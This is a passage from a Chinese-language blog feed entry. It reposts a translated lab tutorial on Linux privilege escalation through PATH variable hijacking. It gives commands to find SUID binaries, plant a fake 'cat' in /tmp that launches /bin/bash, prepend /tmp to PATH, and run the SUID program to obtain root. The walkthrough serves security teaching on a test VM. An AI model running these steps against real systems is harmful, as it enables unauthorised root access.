cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./raj</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p0.ssl.qhimg.com/t014ee07fb0f0ed221c.png" alt=""></p><h2 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令来读取msg.txt是在/home/raj里面,但是/home/raj里面没有这样的文件,然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o ignite</span><br><span class="line">chmod u+s ignite</span><br><span class="line">ls -la ignite</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t01815bb5d1b2aff4ec.png" alt=""></p><h3 id="受害者的虚拟机-2"><a href="#受害者的虚拟机-2" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次损害受害者的系统，然后转移到特权升级阶段，并执行下方命令以查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/ raj/script/拥有suid权限，然后我们进入/home/raj/script，看到一个可执行文件“ignite”。因此，当我们运行这个文件时，它会把一个错误“cat: /home/raj/msg.”txt”的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./ignite</span><br></pre></td></tr></table></figure><h4 id="Vi-Editor"><a href="#Vi-Editor" class="headerlink" title="Vi Editor"></a>Vi Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vi cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p2.ssl.qhimg.com/t01ba696306656a5c53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./ignite</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p3.ssl.qhimg.com/t018279fa8c54aceed2.png" alt=""><br>本文翻译:<a href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;高考加油&quot;&gt;&lt;a href=&quot;#高考加油&quot; class=&quot;headerlink&quot; title=&quot;高考加油&quot;&gt;&lt;/a&gt;高考加油&lt;/h1&gt;&lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
</feed>
